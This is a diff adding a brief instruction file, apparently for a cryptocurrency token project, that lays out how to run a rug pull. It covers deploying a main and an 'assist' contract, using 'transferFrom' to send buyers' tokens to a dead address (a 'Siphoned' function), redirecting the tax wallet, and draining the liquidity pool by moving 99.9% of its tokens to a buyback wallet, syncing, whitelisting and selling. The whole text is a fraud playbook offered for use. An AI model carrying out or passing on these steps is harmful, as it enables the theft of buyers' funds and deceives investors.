@@ -1,0 +1,13 @@
+-Deploy Contract
+1. Deploy the assist contract and get the assist contract address. 
+2. Deploy the Main CA. 
+3. If a user buy token, send buyer all tokens or 99.9% to dead address by using "transferFrom" function. so buyer can't see token  any more.
+It is called "Siphoned" Function that users all token has gone. 
+4. When stop sell fully to rug(drain) the pool, set tax wallet address to assist contract address by using "setTaxWallet" function.
+
+
+-How to rug (drain) the pool.
+1. Send 99.9% token from LP to your buyback wallet address. 
+2. Sync the lp pool. 
+3. Add the buyback wallet address to whitelist on asset contact. 
+4. Sell all tokens from buyback wallet. 
